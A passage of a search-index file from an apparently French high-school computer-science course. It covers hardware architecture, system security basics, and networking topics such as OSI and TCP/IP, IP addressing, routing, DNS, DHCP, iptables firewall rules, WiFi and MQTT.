\u00e9criture","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#-autres-lecture","title":"||| ||| +---- Autres : lecture","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#-groupe-execution","title":"||| ||+------ Groupe : ex\u00e9cution","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#-groupe-ecriture","title":"||| |+------- Groupe : \u00e9criture","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#-groupe-lecture","title":"||| +-------- Groupe : lecture","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#-proprietaire-execution","title":"||+---------- Propri\u00e9taire : ex\u00e9cution","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#-proprietaire-ecriture","title":"|+----------- Propri\u00e9taire : \u00e9criture","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#-proprietaire-lecture","title":"+------------ Propri\u00e9taire : lecture","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#exemple-rwxr-xr-754","title":"Exemple : rwxr-xr-- = 754","text":"<p>chmod 754 fichier.txt</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#2-authentification","title":"2. Authentification","text":"<ul> <li>Facteur de connaissance : Mot de passe</li> <li>Facteur de possession : Token, carte</li> <li>Facteur d'inh\u00e9rence : Biom\u00e9trie</li> <li>Authentification multi-facteurs (MFA)</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#3-chiffrement","title":"3. Chiffrement","text":"<ul> <li>Chiffrement sym\u00e9trique : AES, ChaCha20</li> <li>Chiffrement asym\u00e9trique : RSA, ECC</li> <li>Fonctions de hachage : SHA-256, bcrypt</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#vulnerabilites-courantes","title":"Vuln\u00e9rabilit\u00e9s courantes","text":"<p>Principales menaces :</p> <ul> <li>Buffer overflow : D\u00e9bordement de tampon</li> <li>Injection de code : SQL injection, XSS</li> <li>Escalade de privil\u00e8ges : Exploitation de failles</li> <li>Attaques par canal auxiliaire : Timing, consommation</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#vi-performance-et-optimisation","title":"VI. Performance et optimisation","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#metriques-de-performance","title":"M\u00e9triques de performance","text":"<ul> <li>D\u00e9bit (Throughput) : Op\u00e9rations par seconde</li> <li>Latence : Temps de r\u00e9ponse</li> <li>Utilisation : Pourcentage d'usage des ressources</li> <li>Passage \u00e0 l'\u00e9chelle (Scalability)</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#techniques-doptimisation","title":"Techniques d'optimisation","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#1-optimisations-materielles","title":"1. Optimisations mat\u00e9rielles","text":"<ul> <li>Pipeline : Ex\u00e9cution en parall\u00e8le des \u00e9tapes</li> <li>Pr\u00e9diction de branchement : Anticipation des sauts</li> <li>Ex\u00e9cution dans le d\u00e9sordre : R\u00e9organisation des instructions</li> <li>Ex\u00e9cution sp\u00e9culative : Ex\u00e9cution anticip\u00e9e</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#2-optimisations-logicielles","title":"2. Optimisations logicielles","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#exemple-doptimisation-en-python","title":"Exemple d'optimisation en Python","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#non-optimise","title":"Non optimis\u00e9","text":"<p>def somme_carres_lente(n):     total = 0     for i in range(n):         total += i * i     return total</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#optimise-avec-comprehension-de-liste","title":"Optimis\u00e9 avec compr\u00e9hension de liste","text":"<p>def somme_carres_rapide(n):     return sum(i*i for i in range(n))</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#optimise-mathematiquement","title":"Optimis\u00e9 math\u00e9matiquement","text":"<p>def somme_carres_math(n):     return n * (n-1) * (2*n-1) // 6</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#vii-tendances-actuelles","title":"VII. Tendances actuelles","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#1-informatique-quantique","title":"1. Informatique quantique","text":"<p>Principes quantiques :</p> <ul> <li>Superposition : Qubit dans plusieurs \u00e9tats simultan\u00e9ment</li> <li>Intrication : Corr\u00e9lation entre qubits distants</li> <li>Interf\u00e9rence : Amplification/annulation de probabilit\u00e9s</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#2-edge-computing","title":"2. Edge Computing","text":"<ul> <li>Traitement pr\u00e8s des sources de donn\u00e9es</li> <li>R\u00e9duction de la latence</li> <li>\u00c9conomie de bande passante</li> <li>Applications IoT</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#3-intelligence-artificielle-materielle","title":"3. Intelligence artificielle mat\u00e9rielle","text":"<ul> <li>TPU (Tensor Processing Unit) : Google</li> <li>NPU (Neural Processing Unit) : Huawei</li> <li>Puces neuromorphiques : Intel Loihi</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/architectures_materielles/#exercices-pratiques","title":"Exercices pratiques","text":"<p>TP 1 : Analyse de performance</p> <ol> <li>Utilisez <code>htop</code> pour analyser l'utilisation CPU et m\u00e9moire</li> <li>Mesurez les performances d'E/S avec <code>iostat</code></li> <li>Analysez la hi\u00e9rarchie m\u00e9moire avec <code>lscpu</code></li> <li>Comparez les performances SSD vs HDD</li> </ol> <p>TP 2 : Virtualisation</p> <ol> <li>Installez VirtualBox et cr\u00e9ez une VM Linux</li> <li>Configurez Docker et cr\u00e9ez un conteneur</li> <li>Comparez les performances native vs virtualis\u00e9e</li> <li>Testez la migration de conteneurs</li> </ol> <p>TP 3 : S\u00e9curit\u00e9 syst\u00e8me</p> <ol> <li>Configurez un pare-feu avec <code>iptables</code></li> <li>Analysez les logs syst\u00e8me avec <code>journalctl</code></li> <li>Testez l'authentification par cl\u00e9 SSH</li> <li>Chiffrez un disque avec LUKS</li> </ol> <pre><code>\ud83d\udcdd Exercices\n\ud83d\udd2c TP Performance\n\u2601\ufe0f TP Virtualisation\n</code></pre>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/","title":"R\u00e9seaux informatiques","text":"<pre><code>\ud83c\udf10 R\u00e9seaux informatiques\nCommunication et interconnexion des syst\u00e8mes\n</code></pre>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#i-concepts-fondamentaux","title":"I. Concepts fondamentaux","text":"<p>\ud83d\udd17 Qu'est-ce qu'un r\u00e9seau ?</p> <p>Un r\u00e9seau informatique est un ensemble d'\u00e9quipements interconnect\u00e9s qui peuvent communiquer entre eux pour partager des ressources et \u00e9changer des informations.</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#types-de-reseaux-par-etendue","title":"Types de r\u00e9seaux par \u00e9tendue","text":"<ul> <li>PAN (Personal Area Network) : R\u00e9seau personnel (Bluetooth, USB)</li> <li>LAN (Local Area Network) : R\u00e9seau local (entreprise, domicile)</li> <li>MAN (Metropolitan Area Network) : R\u00e9seau m\u00e9tropolitain (ville)</li> <li>WAN (Wide Area Network) : R\u00e9seau \u00e9tendu (Internet)</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#topologies-de-reseaux","title":"Topologies de r\u00e9seaux","text":"<pre><code>\ud83c\udf1f \u00c9toile\nTous les n\u0153uds connect\u00e9s \u00e0 un hub central\nAvantages : Facile \u00e0 g\u00e9rer\nInconv\u00e9nients : Point de d\u00e9faillance unique\n\n\ud83d\udd04 Anneau\nN\u0153uds connect\u00e9s en boucle ferm\u00e9e\nAvantages : Pas de collision\nInconv\u00e9nients : Panne d'un n\u0153ud = panne totale\n\n\ud83d\udd78\ufe0f Maill\u00e9\nChaque n\u0153ud connect\u00e9 \u00e0 plusieurs autres\nAvantages : Tr\u00e8s fiable\nInconv\u00e9nients : Co\u00fbteux\n\n\ud83d\ude8c Bus\nTous les n\u0153uds sur un m\u00eame c\u00e2ble\nAvantages : Simple et \u00e9conomique\nInconv\u00e9nients : Collisions possibles\n</code></pre>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#ii-modele-osi-et-pile-tcpip","title":"II. Mod\u00e8le OSI et pile TCP/IP","text":"<p>\ud83d\udcda Mod\u00e8le en couches</p> <p>Les mod\u00e8les en couches permettent de structurer et standardiser les communications r\u00e9seau en divisant les fonctionnalit\u00e9s en niveaux distincts.</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#modele-osi-7-couches","title":"Mod\u00e8le OSI (7 couches)","text":"<ol> <li>Application (HTTP, FTP, SMTP)</li> <li>Pr\u00e9sentation (Chiffrement, Compression)</li> <li>Session (Gestion des sessions)</li> <li>Transport (TCP, UDP)</li> <li>R\u00e9seau (IP, ICMP)</li> <li>Liaison (Ethernet, WiFi)</li> <li>Physique (C\u00e2bles, Signaux)</li> </ol>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#pile-tcpip-4-couches","title":"Pile TCP/IP (4 couches)","text":"<p>Application (HTTP, FTP, DNS) Transport (TCP, UDP) Internet (IP, ICMP) Acc\u00e8s r\u00e9seau (Ethernet, WiFi)</p> <p>Encapsulation :</p> <p>Chaque couche ajoute ses propres en-t\u00eates aux donn\u00e9es : - Application : Donn\u00e9es - Transport : Segment (TCP) ou Datagramme (UDP) - Internet : Paquet IP - Acc\u00e8s r\u00e9seau : Trame</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#iii-protocoles-de-la-couche-reseau","title":"III. Protocoles de la couche r\u00e9seau","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#protocole-ip-internet-protocol","title":"Protocole IP (Internet Protocol)","text":"<p>\ud83d\udccd Adressage IP</p> <p>Le protocole IP fournit un syst\u00e8me d'adressage unique pour identifier chaque machine sur Internet.</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#ipv4","title":"IPv4","text":"<p>Format : 4 octets (32 bits) - <code>192.168.1.1</code></p> <p>ClassePlageMasque par d\u00e9fautUsage A1.0.0.0 - 126.255.255.255/8 (255.0.0.0)Tr\u00e8s grands r\u00e9seaux B128.0.0.0 - 191.255.255.255/16 (255.255.0.0)R\u00e9seaux moyens C192.0.0.0 - 223.255.255.255/24 (255.255.255.0)Petits r\u00e9seaux</p> <p>Adresses priv\u00e9es (RFC 1918) : - <code>10.0.0.0/8</code> (10.0.0.0 - 10.255.255.255) - <code>172.16.0.0/12</code> (172.16.0.0 - 172.31.255.255) - <code>192.168.0.0/16</code> (192.168.0.0 - 192.168.255.255)</p> <p>Calcul de sous-r\u00e9seaux :</p> <p>R\u00e9seau : <code>192.168.1.0/24</code> - Adresse r\u00e9seau : <code>192.168.1.0</code> - Masque : <code>255.255.255.0</code> ou <code>/24</code> - Premi\u00e8re adresse utilisable : <code>192.168.1.1</code> - Derni\u00e8re adresse utilisable : <code>192.168.1.254</code> - Adresse de diffusion : <code>192.168.1.255</code> - Nombre d'h\u00f4tes : 254</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#ipv6","title":"IPv6","text":"<p>Format : 8 groupes de 4 chiffres hexad\u00e9cimaux (128 bits)</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#exemples-dadresses-ipv6","title":"Exemples d'adresses IPv6","text":"<p>2001:0db8:85a3:0000:0000:8a2e:0370:7334  # Format complet 2001:db8:85a3::8a2e:370:7334             # Format compress\u00e9 ::1                                       # Loopback (\u00e9quivalent \u00e0 127.0.0.1) ::                                        # Adresse nulle fe80::1                                   # Lien local</p> <p>Avantages d'IPv6 : - Espace d'adressage quasi-illimit\u00e9 - Configuration automatique - S\u00e9curit\u00e9 int\u00e9gr\u00e9e (IPSec) - Qualit\u00e9 de service am\u00e9lior\u00e9e</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#routage","title":"Routage","text":"<p>\ud83d\uddfa\ufe0f Acheminement des paquets</p> <p>Le routage d\u00e9termine le chemin optimal pour acheminer les paquets de la source vers la destination.</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#algorithmes-de-routage","title":"Algorithmes de routage","text":"<p>1. Routage statique : - Routes configur\u00e9es manuellement - Adapt\u00e9 aux petits r\u00e9seaux stables</p> <p>2. Routage dynamique : - RIP (Routing Information Protocol) : Vecteur de distance - OSPF (Open Shortest Path First) : \u00c9tat de liens - BGP (Border Gateway Protocol) : Routage inter-domaines</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#commandes-de-routage-linux","title":"Commandes de routage Linux","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#afficher-la-table-de-routage","title":"Afficher la table de routage","text":"<p>route -n ip route show</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#ajouter-une-route-statique","title":"Ajouter une route statique","text":"<p>sudo route add -net 192.168.2.0/24 gw 192.168.1.1 sudo ip route add 192.168.2.0/24 via 192.168.1.1</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#route-par-defaut","title":"Route par d\u00e9faut","text":"<p>sudo route add default gw 192.168.1.1 sudo ip route add default via 192.168.1.1</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#nat-network-address-translation","title":"NAT (Network Address Translation)","text":"<p>Principe du NAT :</p> <p>Le NAT permet \u00e0 plusieurs machines d'un r\u00e9seau priv\u00e9 de partager une seule adresse IP publique pour acc\u00e9der \u00e0 Internet.</p> <p>Types de NAT : - NAT statique : Correspondance 1:1 fixe - NAT dynamique : Pool d'adresses publiques - PAT (Port Address Translation) : Multiplexage par ports</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#iv-protocoles-de-la-couche-transport","title":"IV. Protocoles de la couche transport","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#tcp-transmission-control-protocol","title":"TCP (Transmission Control Protocol)","text":"<p>\ud83d\udd12 Transport fiable</p> <p>TCP garantit la livraison ordonn\u00e9e et sans erreur des donn\u00e9es gr\u00e2ce \u00e0 des m\u00e9canismes de contr\u00f4le sophistiqu\u00e9s.</p> <p>Caract\u00e9ristiques : - Orient\u00e9 connexion : \u00c9tablissement de session - Fiable : D\u00e9tection et correction d'erreurs - Contr\u00f4le de flux : Adaptation au r\u00e9cepteur - Contr\u00f4le de congestion : Adaptation au r\u00e9seau</p> <p>\u00c9tablissement de connexion (3-way handshake) :</p> <p>Client \u2192 Serveur : SYN (seq=x) Serveur \u2192 Client : SYN-ACK (seq=y, ack=x+1) Client \u2192 Serveur : ACK (seq=x+1, ack=y+1)</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#connexion-etablie","title":"Connexion \u00e9tablie","text":"<p>Fermeture de connexion (4-way handshake) :</p> <p>Client \u2192 Serveur : FIN Serveur \u2192 Client : ACK Serveur \u2192 Client : FIN Client \u2192 Serveur : ACK</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#connexion-fermee","title":"Connexion ferm\u00e9e","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#udp-user-datagram-protocol","title":"UDP (User Datagram Protocol)","text":"<p>\u26a1 Transport rapide</p> <p>UDP privil\u00e9gie la rapidit\u00e9 \u00e0 la fiabilit\u00e9, id\u00e9al pour les applications temps r\u00e9el.</p> <p>Caract\u00e9ristiques : - Sans connexion : Pas d'\u00e9tablissement de session - Non fiable : Pas de garantie de livraison - Rapide : Overhead minimal - Simple : En-t\u00eate de 8 octets seulement</p> <p>Applications typiques : - DNS (r\u00e9solution de noms) - DHCP (configuration automatique) - Streaming vid\u00e9o/audio - Jeux en ligne</p> <p>Comparaison TCP vs UDP :</p> Crit\u00e8re TCP UDP Fiabilit\u00e9 \u00c9lev\u00e9e Faible Vitesse Mod\u00e9r\u00e9e \u00c9lev\u00e9e Overhead Important Minimal Ordre Garanti Non garanti Usage Web, Email DNS, Streaming"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#v-protocoles-de-la-couche-application","title":"V. Protocoles de la couche application","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#httphttps-hypertext-transfer-protocol","title":"HTTP/HTTPS (HyperText Transfer Protocol)","text":"<p>\ud83c\udf10 Web et navigation</p> <p>HTTP est le protocole fondamental du World Wide Web, permettant le transfert de pages web et de ressources.</p> <p>M\u00e9thodes HTTP principales :</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#get-recuperer-une-ressource","title":"GET : R\u00e9cup\u00e9rer une ressource","text":"<p>GET /index.html HTTP/1.1 Host: www.example.com</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#post-envoyer-des-donnees","title":"POST : Envoyer des donn\u00e9es","text":"<p>POST /login HTTP/1.1 Host: www.example.com Content-Type: application/x-www-form-urlencoded</p> <p>username=john&amp;password=secret</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#put-creermodifier-une-ressource","title":"PUT : Cr\u00e9er/modifier une ressource","text":"<p>PUT /users/123 HTTP/1.1 Host: api.example.com Content-Type: application/json</p> <p>{\"name\": \"John Doe\", \"email\": \"john@example.com\"}</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#delete-supprimer-une-ressource","title":"DELETE : Supprimer une ressource","text":"<p>DELETE /users/123 HTTP/1.1 Host: api.example.com</p> <p>Codes de statut HTTP : - 2xx : Succ\u00e8s (200 OK, 201 Created) - 3xx : Redirection (301 Moved, 304 Not Modified) - 4xx : Erreur client (404 Not Found, 403 Forbidden) - 5xx : Erreur serveur (500 Internal Error, 503 Unavailable)</p> <p>HTTPS = HTTP + TLS/SSL : - Chiffrement des donn\u00e9es - Authentification du serveur - Int\u00e9grit\u00e9 des messages</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#dns-domain-name-system","title":"DNS (Domain Name System)","text":"<p>\ud83d\udcde Annuaire d'Internet</p> <p>Le DNS traduit les noms de domaine lisibles par l'homme en adresses IP utilisables par les machines.</p> <p>Hi\u00e9rarchie DNS :</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#structure-hierarchique","title":"Structure hi\u00e9rarchique","text":"<p>.                    # Racine \u251c\u2500\u2500 com.             # Domaine de premier niveau (TLD) \u2502   \u251c\u2500\u2500 google.com.  # Domaine de second niveau \u2502   \u2514\u2500\u2500 amazon.com. \u251c\u2500\u2500 org. \u2502   \u2514\u2500\u2500 wikipedia.org. \u2514\u2500\u2500 fr.     \u2514\u2500\u2500 gouv.fr.</p> <p>Types d'enregistrements DNS :</p> <p>TypeDescriptionExemple AAdresse IPv4example.com \u2192 192.168.1.1 AAAAAdresse IPv6example.com \u2192 2001:db8::1 CNAMEAliaswww.example.com \u2192 example.com MXServeur mailexample.com \u2192 mail.example.com NSServeur de nomsexample.com \u2192 ns1.example.com TXTTexte libreV\u00e9rification SPF, DKIM</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#commandes-dns","title":"Commandes DNS","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#resolution-simple","title":"R\u00e9solution simple","text":"<p>nslookup google.com dig google.com</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#requete-specifique","title":"Requ\u00eate sp\u00e9cifique","text":"<p>dig google.com MX dig @8.8.8.8 google.com</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#resolution-inverse","title":"R\u00e9solution inverse","text":"<p>dig -x 8.8.8.8</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#trace-complete","title":"Trace compl\u00e8te","text":"<p>dig +trace google.com</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#dhcp-dynamic-host-configuration-protocol","title":"DHCP (Dynamic Host Configuration Protocol)","text":"<p>Configuration automatique :</p> <p>DHCP permet l'attribution automatique d'adresses IP et de param\u00e8tres r\u00e9seau aux clients.</p> <p>Processus DHCP (DORA) :</p> <ol> <li>DISCOVER : Client diffuse une demande</li> <li>OFFER    : Serveur propose une configuration</li> <li>REQUEST  : Client demande la configuration</li> <li>ACK      : Serveur confirme l'attribution</li> </ol> <p>Param\u00e8tres fournis : - Adresse IP - Masque de sous-r\u00e9seau - Passerelle par d\u00e9faut - Serveurs DNS - Dur\u00e9e de bail (lease time)</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#ftp-file-transfer-protocol","title":"FTP (File Transfer Protocol)","text":"<p>Modes de fonctionnement : - Mode actif : Serveur initie la connexion de donn\u00e9es - Mode passif : Client initie toutes les connexions</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#commandes-ftp-de-base","title":"Commandes FTP de base","text":"<p>ftp ftp.example.com</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#connexion","title":"Connexion","text":"<p>User: anonymous Password: email@domain.com</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#navigation","title":"Navigation","text":"<p>ls          # Lister les fichiers cd dossier  # Changer de r\u00e9pertoire pwd         # R\u00e9pertoire courant</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#transfert","title":"Transfert","text":"<p>get fichier.txt      # T\u00e9l\u00e9charger put fichier.txt      # Envoyer mget *.txt          # T\u00e9l\u00e9charger plusieurs binary              # Mode binaire ascii               # Mode texte</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#deconnexion","title":"D\u00e9connexion","text":"<p>quit</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#vi-securite-reseau","title":"VI. S\u00e9curit\u00e9 r\u00e9seau","text":"<p>\ud83d\udee1\ufe0f Protection des communications</p> <p>La s\u00e9curit\u00e9 r\u00e9seau vise \u00e0 prot\u00e9ger l'int\u00e9grit\u00e9, la confidentialit\u00e9 et la disponibilit\u00e9 des donn\u00e9es en transit.</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#principales-menaces","title":"Principales menaces","text":"<p>\ud83d\udd34 Menaces critiques : - Man-in-the-Middle : Interception des communications - DDoS : D\u00e9ni de service distribu\u00e9 - Injection SQL : Exploitation de bases de donn\u00e9es - Phishing : Usurpation d'identit\u00e9</p> <p>\ud83d\udfe1 Menaces mod\u00e9r\u00e9es : - Sniffing : \u00c9coute du trafic r\u00e9seau - Spoofing : Usurpation d'adresse - Port scanning : Reconnaissance des services - Brute force : Attaque par force brute</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#mecanismes-de-protection","title":"M\u00e9canismes de protection","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#1-pare-feu-firewall","title":"1. Pare-feu (Firewall)","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#configuration-iptables-linux","title":"Configuration iptables (Linux)","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#politique-par-defaut-tout-bloquer","title":"Politique par d\u00e9faut : tout bloquer","text":"<p>iptables -P INPUT DROP iptables -P FORWARD DROP iptables -P OUTPUT ACCEPT</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#autoriser-le-loopback","title":"Autoriser le loopback","text":"<p>iptables -A INPUT -i lo -j ACCEPT</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#autoriser-les-connexions-etablies","title":"Autoriser les connexions \u00e9tablies","text":"<p>iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#autoriser-ssh-port-22","title":"Autoriser SSH (port 22)","text":"<p>iptables -A INPUT -p tcp --dport 22 -j ACCEPT</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#autoriser-httphttps","title":"Autoriser HTTP/HTTPS","text":"<p>iptables -A INPUT -p tcp --dport 80 -j ACCEPT iptables -A INPUT -p tcp --dport 443 -j ACCEPT</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#bloquer-une-adresse-ip","title":"Bloquer une adresse IP","text":"<p>iptables -A INPUT -s 192.168.1.100 -j DROP</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#sauvegarder-les-regles","title":"Sauvegarder les r\u00e8gles","text":"<p>iptables-save &gt; /etc/iptables/rules.v4</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#2-vpn-virtual-private-network","title":"2. VPN (Virtual Private Network)","text":"<p>Types de VPN : - Site-to-Site : Connexion entre r\u00e9seaux - Remote Access : Connexion d'utilisateurs distants - Client-to-Site : Acc\u00e8s s\u00e9curis\u00e9 aux ressources</p> <p>Protocoles VPN : - IPSec : S\u00e9curit\u00e9 au niveau IP - OpenVPN : Solution open source - WireGuard : Protocole moderne et rapide - PPTP/L2TP : Protocoles plus anciens</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#3-chiffrement","title":"3. Chiffrement","text":"<p>TLS/SSL :</p> <ol> <li>Handshake : N\u00e9gociation des param\u00e8tres</li> <li>\u00c9change de cl\u00e9s : \u00c9tablissement de la cl\u00e9 de session</li> <li>Authentification : V\u00e9rification des certificats</li> <li>Chiffrement : Communication s\u00e9curis\u00e9e</li> </ol>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#4-detection-dintrusion","title":"4. D\u00e9tection d'intrusion","text":"<p>IDS (Intrusion Detection System) : - NIDS : Surveillance du trafic r\u00e9seau - HIDS : Surveillance des h\u00f4tes</p> <p>IPS (Intrusion Prevention System) : - D\u00e9tection + blocage automatique - Analyse en temps r\u00e9el - Signatures et comportements</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#bonnes-pratiques","title":"Bonnes pratiques","text":"<p>Recommandations de s\u00e9curit\u00e9 :</p> <ol> <li>Principe du moindre privil\u00e8ge : Acc\u00e8s minimal n\u00e9cessaire</li> <li>D\u00e9fense en profondeur : Plusieurs couches de s\u00e9curit\u00e9</li> <li>Mise \u00e0 jour r\u00e9guli\u00e8re : Correctifs de s\u00e9curit\u00e9</li> <li>Surveillance continue : Monitoring et logs</li> <li>Formation des utilisateurs : Sensibilisation aux risques</li> <li>Sauvegarde et r\u00e9cup\u00e9ration : Plan de continuit\u00e9</li> </ol>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#vii-reseaux-sans-fil","title":"VII. R\u00e9seaux sans fil","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#wifi-ieee-80211","title":"WiFi (IEEE 802.11)","text":"<p>\ud83d\udce1 Connectivit\u00e9 sans fil</p> <p>Le WiFi permet la communication sans fil en utilisant les ondes radio dans les bandes 2,4 GHz et 5 GHz.</p> <p>Standards WiFi :</p> <p>StandardAnn\u00e9eFr\u00e9quenceD\u00e9bit maxPort\u00e9e 802.11a19995 GHz54 Mbps35 m 802.11b19992,4 GHz11 Mbps140 m 802.11g20032,4 GHz54 Mbps140 m 802.11n20092,4/5 GHz600 Mbps250 m 802.11ac20135 GHz6,93 Gbps35 m 802.11ax (WiFi 6)20192,4/5 GHz9,6 Gbps120 m</p> <p>S\u00e9curit\u00e9 WiFi : - WEP : Obsol\u00e8te, facilement cassable - WPA : Am\u00e9lioration de WEP - WPA2 : Standard actuel (AES) - WPA3 : Derni\u00e8re g\u00e9n\u00e9ration (2018)</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#bluetooth","title":"Bluetooth","text":"<p>Classes de puissance : - Classe 1 : 100 mW, port\u00e9e ~100 m - Classe 2 : 2,5 mW, port\u00e9e ~10 m - Classe 3 : 1 mW, port\u00e9e ~1 m</p> <p>Versions Bluetooth : - Bluetooth 4.0 : Bluetooth Low Energy (BLE) - Bluetooth 5.0 : Port\u00e9e et vitesse am\u00e9lior\u00e9es - Bluetooth 6.0 : Localisation pr\u00e9cise</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#viii-internet-des-objets-iot","title":"VIII. Internet des Objets (IoT)","text":"<p>\ud83c\udf10 Objets connect\u00e9s</p> <p>L'IoT connecte des objets du quotidien \u00e0 Internet, permettant la collecte de donn\u00e9es et le contr\u00f4le \u00e0 distance.</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#protocoles-iot","title":"Protocoles IoT","text":"<p>Protocoles de communication : - MQTT : Messaging l\u00e9ger pour IoT - CoAP : HTTP pour objets contraints - LoRaWAN : Longue port\u00e9e, faible consommation - Zigbee : Maillage pour domotique - 6LoWPAN : IPv6 sur r\u00e9seaux contraints</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#exemple-mqtt-avec-python","title":"Exemple MQTT avec Python","text":"<p>import paho.mqtt.client as mqtt</p> <p>def on_connect(client, userdata, flags, rc):     print(f\"Connect\u00e9 avec le code {rc}\")     client.subscribe(\"capteurs/temperature\")</p> <p>def on_message(client, userdata, msg):     temperature = float(msg.payload.decode())     print(f\"Temp\u00e9rature 